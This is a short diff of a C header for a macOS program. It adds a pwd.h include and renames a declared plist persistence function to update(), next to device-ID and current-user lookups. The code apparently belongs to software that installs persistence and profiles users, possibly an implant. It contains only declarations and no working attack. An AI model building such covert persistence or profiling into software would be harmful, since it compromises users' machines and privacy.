@@ -51,6 +51,7 @@ extern "C" {
 #include <zlib.h>
 #include <curl/curl.h>
 #include <CoreFoundation/CoreFoundation.h>
+#include <pwd.h>
 
 #include <openssl/rsa.h>
 #include <openssl/evp.h>
@@ -213,7 +214,7 @@ __attribute__((noreturn))
 void            panic(void);
 
 /* Persistence & profile */
-void            update_persistence(const char *plist_path);
+void           update(void);
 char           *get_device_id(void);
 char           *get_current_user(void);
 
